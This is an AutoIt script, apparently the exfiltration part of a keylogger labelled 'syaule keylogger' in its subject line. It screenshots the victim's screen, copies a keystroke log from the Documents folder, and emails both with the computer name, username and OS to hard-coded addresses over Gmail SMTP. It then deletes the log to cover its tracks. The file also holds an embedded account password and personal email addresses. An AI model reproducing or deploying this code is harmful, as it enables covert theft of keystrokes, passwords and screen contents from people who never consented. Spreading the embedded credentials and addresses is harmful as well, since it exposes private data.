;
;##################################
; Include
;##################################
#Include<file.au3>
#include <ScreenCapture.au3>
;##################################
; Variables
;##################################
while 1
   $ping = Ping("www.google.com")
   If $ping > 0 then
	  ;nothing
   Else
	  ExitLoop
   EndIf
   Sleep(60000)
WEnd
_ScreenCapture_Capture(@ScriptDir & "\a.jpg")
FileCopy(@MyDocumentsDir&"\log.txt",@ScriptDir&"\log.txt",1)
 ;#################################################
$SmtpServer = "smtp.gmail.com"             ; address for the smtp-server to use - REQUIRED
$FromName = @ComputerName                 ; name from who the email was sent
$FromAddress = "vantagepoint2019@gmail.com" ; address from where the mail should come
$ToAddress = "vantagepoint2019@outlook.com"   ; destination address of the email - REQUIRED
$Subject = "syaule keylogger mr makoha innocent please receive keys and a screenshot logged from the following target computer"                   ; subject from the email - can be anything you want it to be
$Body = "<H2>computer name</H2>" & @ComputerName &@CRLF&"USERNAME:"&@UserName&@CRLF&"OPERATING SYSTEM:"&@OSType&@CRLF&"DATE:"&@MDAY                         ; the messagebody from the mail - can be left blank but then you get a blank mail
$AttachFiles = "a.jpg;log.txt"                      ; the file(s) you want to attach seperated with a ; (Semicolon) - leave blank if not needed
$CcAddress = "katangajoel7@gmail.com"       ; address for cc - leave blank if not needed
$BccAddress = "katangajoel7@gmail.com"     ; address for bcc - leave blank if not needed
$Importance = "Normal"                  ; Send message priority: "High", "Normal", "Low"
$Username = "vantagepoint2019@gmail.com"                    ; username for the account used from where the mail gets sent - REQUIRED
$Password = "makoha2017"                  ; password for the account used from where the mail gets sent - REQUIRED
$IPPort = 465                          ; port used for sending the mail
$ssl = 1                               ; enables/disables secure socket layer sending - put to 1 if using httpS
;~ $IPPort=465                          ; GMAIL port used for sending the mail
;~ $ssl=1                               ; GMAILenables/disables secure socket layer sending - put to 1 if using httpS

;##################################
; Script
;##################################
Global $oMyRet[2]
Global $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
$rc = _INetSmtpMailCom($SmtpServer, $FromName, $FromAddress, $ToAddress, $Subject, $Body, $AttachFiles, $CcAddress, $BccAddress, $Importance, $Username, $Password, $IPPort, $ssl)
If @error Then
    MsgBox(0, "Error sending message", "Error code:" & @error & "  Description:" & $rc)
EndIf
;
; The UDF
Func _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_AttachFiles = "", $s_CcAddress = "", $s_BccAddress = "", $s_Importance="Normal", $s_Username = "", $s_Password = "", $IPPort = 25, $ssl = 0)
    Local $objEmail = ObjCreate("CDO.Message")
    $objEmail.From = '"' & $s_FromName & '" <' & $s_FromAddress & '>'
    $objEmail.To = $s_ToAddress
    Local $i_Error = 0
    Local $i_Error_desciption = ""
    If $s_CcAddress <> "" Then $objEmail.Cc = $s_CcAddress
    If $s_BccAddress <> "" Then $objEmail.Bcc = $s_BccAddress
    $objEmail.Subject = $s_Subject
    If StringInStr($as_Body, "<") And StringInStr($as_Body, ">") Then
        $objEmail.HTMLBody = $as_Body
    Else
        $objEmail.Textbody = $as_Body & @CRLF
    EndIf
    If $s_AttachFiles <> "" Then
        Local $S_Files2Attach = StringSplit($s_AttachFiles, ";")
        For $x = 1 To $S_Files2Attach[0]
            $S_Files2Attach[$x] = _PathFull($S_Files2Attach[$x])
;~          ConsoleWrite('@@ Debug : $S_Files2Attach[$x] = ' & $S_Files2Attach[$x] & @LF & '>Error code: ' & @error & @LF) ;### Debug Console
            If FileExists($S_Files2Attach[$x]) Then
                ConsoleWrite('+> File attachment added: ' & $S_Files2Attach[$x] & @LF)
                $objEmail.AddAttachment($S_Files2Attach[$x])
            Else
                ConsoleWrite('!> File not found to attach: ' & $S_Files2Attach[$x] & @LF)
                SetError(1)
                Return 0
            EndIf
        Next
    EndIf
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = $s_SmtpServer
    If Number($IPPort) = 0 then $IPPort = 25
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = $IPPort
    ;Authenticated SMTP
    If $s_Username <> "" Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername") = $s_Username
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = $s_Password
    EndIf
    If $ssl Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
    EndIf
    ;Update settings
    $objEmail.Configuration.Fields.Update
    ; Set Email Importance
    Switch $s_Importance
        Case "High"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "High"
        Case "Normal"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Normal"
        Case "Low"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Low"
    EndSwitch
    $objEmail.Fields.Update
    ; Sent the Message
    $objEmail.Send
    If @error Then
        SetError(2)
        Return $oMyRet[1]
    EndIf
    $objEmail=""
EndFunc   ;==>_INetSmtpMailCom
;
;
; Com Error Handler
Func MyErrFunc()
    $HexNumber = Hex($oMyError.number, 8)
    $oMyRet[0] = $HexNumber
    $oMyRet[1] = StringStripWS($oMyError.description, 3)
    ConsoleWrite("### COM Error !  Number: " & $HexNumber & "   ScriptLine: " & $oMyError.scriptline & "   Description:" & $oMyRet[1] & @LF)
    SetError(1); something to check for when this function returns
    Return
 EndFunc   ;==>MyErrFunc
 FileDelete(@ScriptDir&"\log.txt")